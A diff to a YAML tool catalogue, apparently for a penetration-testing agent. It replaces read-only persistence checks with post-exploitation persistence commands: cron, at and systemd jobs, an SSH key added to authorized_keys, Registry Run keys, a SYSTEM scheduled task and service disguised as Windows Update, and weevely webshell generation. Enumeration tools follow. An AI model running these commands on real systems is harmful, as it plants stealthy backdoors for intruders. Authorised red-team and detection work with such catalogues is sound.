@@ -1,38 +1,146 @@
-system_tools:
-  description: "Built-in OS utilities for checking persistence locations"
+# ── Linux Persistence Tools ──────────────────────────────────────
+
+crontab:
+  description: "Manage user cron jobs for scheduled persistence (T1053.003)"
+  category: "post_exploitation"
+  install_cmd: "apt-get install -y cron"
+  verify_cmd: "crontab -l"
+  examples:
+    - '(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/lib/update-notifier/check.sh") | crontab -'
+    - "crontab -l"
+    - "crontab -r"
+
+systemctl:
+  description: "Create and manage systemd service/timer persistence (T1543.002)"
   category: "post_exploitation"
   install_cmd: ""
-  verify_cmd: ""
+  verify_cmd: "systemctl --version"
   examples:
-    - "crontab -l"
-    - "ls -la /etc/cron.*"
+    - "systemctl enable update-helper.service"
+    - "systemctl start update-helper.service"
+    - "systemctl list-unit-files --type=service | grep enabled"
     - "systemctl list-timers --all"
-    - "schtasks /query /fo LIST /v"
-    - "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""
 
-winpeas:
-  description: "Windows enumeration helper for persistence and misconfigurations"
+at:
+  description: "Schedule one-time task execution (T1053.001)"
   category: "post_exploitation"
-  install_cmd: "echo 'Run on Windows host'"
-  verify_cmd: "echo 'See toolcard for usage'"
+  install_cmd: "apt-get install -y at"
+  verify_cmd: "at -V"
   examples:
-    - "winPEASx64.exe"
+    - 'echo "/usr/lib/update-helper/svc" | at now + 1 minute'
+    - "atq"
+    - "atrm 1"
+
+ssh-keygen:
+  description: "Generate SSH keys for authorized_keys persistence (T1098.004)"
+  category: "post_exploitation"
+  install_cmd: ""
+  verify_cmd: "ssh-keygen --help"
+  examples:
+    - "ssh-keygen -t rsa -b 4096 -f /tmp/persistence_key -N ''"
+    - 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys'
+    - "chmod 600 ~/.ssh/authorized_keys"
+
+# ── Windows Persistence Tools ───────────────────────────────────
+
+reg.exe:
+  description: "Registry manipulation for Run key and Winlogon persistence (T1547.001, T1547.004)"
+  category: "post_exploitation"
+  install_cmd: ""
+  verify_cmd: "reg /?"
+  examples:
+    - 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateHelper /t REG_SZ /d "C:\ProgramData\update\svc.exe" /f'
+    - 'reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"'
+    - 'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateHelper /f'
+
+schtasks.exe:
+  description: "Create and manage scheduled tasks for persistence (T1053.005)"
+  category: "post_exploitation"
+  install_cmd: ""
+  verify_cmd: "schtasks /?"
+  examples:
+    - 'schtasks /create /sc minute /mo 5 /tn "Microsoft\Windows\UpdateOrchestrator\UpdateCheck" /tr "C:\ProgramData\update\svc.exe" /ru SYSTEM /f'
+    - "schtasks /query /fo LIST /v"
+    - 'schtasks /delete /tn "UpdateCheck" /f'
+
+sc.exe:
+  description: "Create and manage Windows services for persistence (T1543.003)"
+  category: "post_exploitation"
+  install_cmd: ""
+  verify_cmd: "sc /?"
+  examples:
+    - 'sc create UpdateSvc binpath= "C:\ProgramData\update\svc.exe" start= auto DisplayName= "Windows Update Helper"'
+    - 'sc description UpdateSvc "System update coordination"'
+    - "sc delete UpdateSvc"
+
+wmic:
+  description: "WMI event subscription and process management (T1546.003)"
+  category: "post_exploitation"
+  install_cmd: ""
+  verify_cmd: "wmic /?"
+  examples:
+    - 'wmic process call create "C:\ProgramData\update\svc.exe"'
+    - "Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding"
+    - "Get-WMIObject -Namespace root\\Subscription -Class __EventFilter"
+
+# ── Web Persistence Tools ───────────────────────────────────────
+
+weevely:
+  description: "Stealth PHP webshell generator with encrypted communication (T1505.003)"
+  category: "post_exploitation"
+  install_cmd: "apt-get install -y weevely"
+  verify_cmd: "weevely --help"
+  examples:
+    - "weevely generate s3cr3t /tmp/shell.php"
+    - "weevely http://target.com/uploads/shell.php s3cr3t"
+    - "weevely session /tmp/weevely_session.rc"
+
+# ── Enumeration & Validation Tools ──────────────────────────────
+
+autoruns:
+  description: "Sysinternals Autoruns — enumerate all Windows autostart persistence locations"
+  category: "post_exploitation"
+  install_cmd: "Download from https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns"
+  verify_cmd: "autorunsc.exe -h"
+  examples:
+    - "autorunsc.exe -a * -c -s -h"
+    - "autorunsc.exe -a l -c"
 
 seatbelt:
-  description: "Windows security enumeration for persistence indicators"
+  description: "Windows security enumeration including persistence indicators"
   category: "post_exploitation"
-  install_cmd: "echo 'Run on Windows host'"
-  verify_cmd: "echo 'See toolcard for usage'"
+  install_cmd: "Compile from https://github.com/GhostPack/Seatbelt"
+  verify_cmd: "Seatbelt.exe -h"
   examples:
     - "Seatbelt.exe -group=system"
+    - "Seatbelt.exe AutoRuns ScheduledTasks"
+
+winpeas:
+  description: "Windows privilege escalation and persistence enumeration"
+  category: "post_exploitation"
+  install_cmd: "Download from https://github.com/carlospolop/PEASS-ng/releases"
+  verify_cmd: "winPEASx64.exe -h"
+  examples:
+    - "winPEASx64.exe quiet servicesinfo applicationsinfo"
 
 linpeas:
-  description: "Linux enumeration helper for persistence checks"
+  description: "Linux enumeration for persistence and privilege escalation paths"
   category: "post_exploitation"
   install_cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh"
   verify_cmd: "bash /tmp/linpeas.sh -h"
   examples:
-    - "bash /tmp/linpeas.sh"
+    - "bash /tmp/linpeas.sh -a"
+    - "bash /tmp/linpeas.sh -s"
+
+pspy:
+  description: "Monitor Linux processes without root — detect cron and persistence execution"
+  category: "post_exploitation"
+  install_cmd: "Download from https://github.com/DominicBreuker/pspy/releases"
+  verify_cmd: "./pspy64 --help"
+  examples:
+    - "./pspy64 -pf -i 1000"
+
+# ── Reporting ───────────────────────────────────────────────────
 
 normalize_persistence:
   description: "Normalize persistence notes into JSON inventory"
